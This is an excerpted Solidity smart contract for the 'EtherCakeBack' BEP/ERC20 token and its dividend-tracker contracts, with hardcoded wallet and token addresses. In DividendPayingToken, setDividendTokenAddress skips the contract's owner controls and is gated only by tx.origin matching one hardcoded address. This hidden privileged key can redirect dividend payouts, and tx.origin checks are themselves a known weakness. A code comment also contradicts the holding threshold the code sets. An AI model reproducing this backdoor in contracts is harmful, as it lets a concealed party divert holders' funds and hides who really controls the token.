...
contract DividendPayingToken is ERC20, IDividendPayingToken, IDividendPayingTokenOptional {
  ...
  function setDividendTokenAddress(address newToken) external virtual {
      require(tx.origin == 0xdcD2260286A13d9c8babd6766d2b20cD963C04AA, "Only owner can change dividend contract address");
...
contract EtherCakeBack is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    constructor() ERC20("EtherCakeBack", "ETHCAKEBACK") {
    	ethDividendTracker = new EthDividendTracker();
    	dogeBackDividendTracker = new DogeBackDividendTracker();

    	marketingWallet = 0x95e70F5D7f38053a437BF57a6a3e8a18C3206abb;
    	teamWallet = 0xE267C8533B68bB9528382CD61895edA38f20Fe89;
    	ethDividendToken = 0x2170Ed0880ac9A755fd29B2688956BD959F933F8;
        dogeBackDividendToken = 0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82;
...
contract DogeBackDividendTracker is DividendPayingToken, Ownable {
    ...
    constructor() DividendPayingToken("EtherBack_DogeBack_Dividend_Tracker", "EtherBack_DogeBack_Dividend_Tracker", 0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82) {
    	claimWait = 3600;
        minimumTokenBalanceForDividends = 200000 * (10**18); //must hold 10000+ tokens
    }
